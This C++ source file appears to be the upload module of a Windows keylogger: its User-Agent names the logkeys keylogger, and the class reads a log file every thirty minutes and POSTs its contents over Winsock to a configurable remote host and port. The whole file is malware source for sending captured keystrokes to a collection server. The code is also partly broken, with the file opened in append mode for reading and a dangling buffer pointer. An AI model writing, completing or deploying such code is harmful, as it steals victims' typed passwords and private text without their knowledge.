#include "Uploader.h"

// TODO fix this code
LUploader::LUploader(const char * fn, const char *hn, const char * porte) {
	port = porte;
	fileName = fn;
	host = hn;
	
logTime = (long)time(NULL);
logTime = logTime + (30*60); 			
}
int LUploader::uploadIt() {
	if(logTime <= (long)time(NULL)) {
		sendHttp();
		logTime = (long)time(NULL);
logTime = logTime + (30*60); 
		return 1;
	}
	return 0;
}
void LUploader::sendHttp() {
   initConnection();
    std::cout<<"Started Uploading"<<std::endl;
    
    std::string fileContents, line;
   mfile.open(fileName.c_str(),std::ios_base::app);
    while(std::getline(mfile, line)) fileContents+= line + "\n";
//    std::cout<<fileName;
    
   mfile.close();
    
        std::stringstream  obuf;
        
        obuf << "POST " << "/" << " HTTP/1.1\r\n"
        "Host: " << "127.0.0.1" << "\r\n"
        "User-Agent: lionel\r\n"
        "User-Agent: logkeys (https://github.com/kernc/logkeys)\r\n"
        "Accept: */*\r\n"
        "Content-Type: text/plain\r\n"
        "Content-Length: " << fileContents.size() << "\r\n"
        "\r\n" << fileContents;
        
        const char * buffer = obuf.str().c_str();
      //  std::cout<<buffer<<std::endl;
        sendIt(buffer);
        return;
        
        
        
}


void LUploader::initConnection() {
	
	int	res = WINAPI WSAStartup(MAKEWORD(2,2), &wsd);
	
	if(res!=0) {
		std::cout << "WSAStartup failed";	}
		
	struct addrinfo * resultints=NULL, *ptrs=NULL, hints;
	ZeroMemory(&hints, sizeof(hints));
	
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	
	res = getaddrinfo(host.c_str(), port.c_str(), &hints, &resultints);
	
	if(res != 0){
		std::cout << "getaddrinfo failed: " << res << " \n";
		WSACleanup();
		exit(1);
	}
	else {
			ptrs = resultints;
	
	Cs = socket(ptrs->ai_family,ptrs->ai_socktype,
	ptrs->ai_protocol);
	
	if(Cs == INVALID_SOCKET){
		
		std::cout<< "Error at socket():" << WSAGetLastError() << " \n";
		freeaddrinfo(resultints);
		WSACleanup();
	}
int	resl = connect(Cs, ptrs->ai_addr, (int)ptrs->ai_addrlen);
	
	if(resl==SOCKET_ERROR) {
		std::cout<<"failed to connect to socket\n";
		closesocket(Cs);
		Cs = INVALID_SOCKET;
	}
	freeaddrinfo(resultints);
	
	if(Cs == INVALID_SOCKET) {
//		freeaddrinfo(res);
		WSACleanup();
		std::cout<<"end\n";
		lExit();
	}
	else{
		canLog = true; 
			std::cout<<"conneccted";
	}
		}

	
}


void LUploader::sendIt(const char * buffer) {

int rbLen = DEFAULT_BUFLEN;
char recBuf[ DEFAULT_BUFLEN ];

int iResult = send(Cs, buffer, (int)strlen(buffer), 0);

if(iResult == SOCKET_ERROR) {
 std::cout<<"send failed";
 closesocket(Cs);
 WSACleanup();
 return;
}
iResult = shutdown(Cs, SD_SEND);
if(iResult == SOCKET_ERROR) {
 std::cout<<"send failed";
 closesocket(Cs);
 WSACleanup();
 return;
}
std::cout<<"uploaded successfully";
closesocket(Cs);
}

LUploader::~LUploader() {
	
}

